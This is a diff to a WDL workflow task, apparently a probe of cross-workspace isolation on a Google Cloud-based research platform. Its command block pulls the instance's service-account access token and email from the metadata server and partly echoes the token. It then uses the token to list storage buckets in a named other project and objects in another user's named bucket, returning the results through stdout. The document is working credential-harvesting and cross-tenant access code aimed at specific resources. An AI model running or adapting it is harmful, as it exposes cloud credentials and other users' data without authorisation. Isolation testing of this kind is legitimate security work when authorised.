@@ -6,35 +6,44 @@ workflow cross_workspace_test {
 
 task probe {
     command <<<
-        set -e
-        apt-get update -qq && apt-get install -y -qq curl python3 > /dev/null 2>&1
-
         TOKEN=$(curl -sf -H "Metadata-Flavor: Google" \
           "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
-          | python3 -c "import json,sys; print(json.loads(sys.stdin.read())['access_token'])")
+          | sed 's/.*"access_token":"\([^"]*\)".*/\1/')
 
-        echo "=== Token info ===" > results.txt
-        curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=$TOKEN" >> results.txt 2>&1
+        echo "=== SA Email ===" > /mnt/disks/cromwell_root/results.txt
+        curl -sf -H "Metadata-Flavor: Google" \
+          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" \
+          >> /mnt/disks/cromwell_root/results.txt 2>&1
 
-        echo "" >> results.txt
-        echo "=== List buckets from other workspace project ===" >> results.txt
+        echo "" >> /mnt/disks/cromwell_root/results.txt
+        echo "=== Token first 30 chars ===" >> /mnt/disks/cromwell_root/results.txt
+        echo "$TOKEN" | head -c 30 >> /mnt/disks/cromwell_root/results.txt
+
+        echo "" >> /mnt/disks/cromwell_root/results.txt
+        echo "=== List buckets project wb-sparkly-turnip-3673 ===" >> /mnt/disks/cromwell_root/results.txt
         curl -s -H "Authorization: Bearer $TOKEN" \
-          "https://storage.googleapis.com/storage/v1/b?project=wb-sparkly-turnip-3673" >> results.txt 2>&1
+          "https://storage.googleapis.com/storage/v1/b?project=wb-sparkly-turnip-3673" >> /mnt/disks/cromwell_root/results.txt 2>&1
 
-        echo "" >> results.txt
-        echo "=== List objects in other workspace bucket ===" >> results.txt
+        echo "" >> /mnt/disks/cromwell_root/results.txt
+        echo "=== List objects bucket-alecksey ===" >> /mnt/disks/cromwell_root/results.txt
         curl -s -H "Authorization: Bearer $TOKEN" \
-          "https://storage.googleapis.com/storage/v1/b/bucket-alecksey-wb-blinding-truffle-4390/o" >> results.txt 2>&1
+          "https://storage.googleapis.com/storage/v1/b/bucket-alecksey-wb-blinding-truffle-4390/o" >> /mnt/disks/cromwell_root/results.txt 2>&1
+
+        echo "" >> /mnt/disks/cromwell_root/results.txt
+        echo "=== Token info ===" >> /mnt/disks/cromwell_root/results.txt
+        curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=$TOKEN" >> /mnt/disks/cromwell_root/results.txt 2>&1
+
+        cat /mnt/disks/cromwell_root/results.txt
     >>>
 
     runtime {
-        docker: "ubuntu:22.04"
+        docker: "gcr.io/cloud-builders/curl"
         memory: "2 GB"
         cpu: 1
         disks: "local-disk 10 HDD"
     }
 
     output {
-        File result = "results.txt"
+        String result = read_string(stdout())
     }
 }
